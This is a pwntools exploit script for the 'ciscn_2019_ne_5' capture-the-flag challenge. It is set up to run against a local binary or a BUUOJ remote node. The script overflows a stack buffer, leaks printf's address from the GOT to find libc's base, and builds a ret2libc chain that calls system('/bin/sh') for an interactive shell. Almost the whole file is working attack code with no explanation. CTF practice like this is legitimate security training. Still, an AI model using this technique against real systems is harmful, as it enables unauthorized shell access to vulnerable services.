#coding:utf-8

import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ciscn_2019_ne_5')
			#io=process(['./ciscn_2019_es_2'],env={'LD_PRELOAD':'./libc.so.6'})
			elf=ELF('./ciscn_2019_ne_5')
			libc=ELF('/lib/i386-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',28546)
			elf=ELF('ciscn_2019_ne_5')
			libc=ELF('../../i386libc/libc.so.6')


		def add(a):
			io.recv()
			io.sendline('1')
			io.sendlineafter('Please input new log info:',a)

		def pwd():
			password='administrator'
			io.sendlineafter('password:',password)

		def cpy():
			io.recv()
			io.sendline('4')

		def show():
			io.recv()
			io.sendline('2')
		


		pwd()
		pay='a'*0x4c+p32(elf.plt['printf'])+p32(0x8048522)+p32(elf.got['printf'])
		add(pay)
		cpy()
		io.recvuntil('\n')
		libc_base=u32(io.recv(4))-libc.sym['printf']
		success('libc_base:'+hex(libc_base))
		libc.address=libc_base
		pwd()
		pay='a'*0x4c+p32(libc.sym['system'])+p32(0x8048522)+p32(libc.search('/bin/sh\x00').next())
		add(pay)
		cpy()



		#gdb.attach(io)
		#pause()
		io.interactive()
	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	pass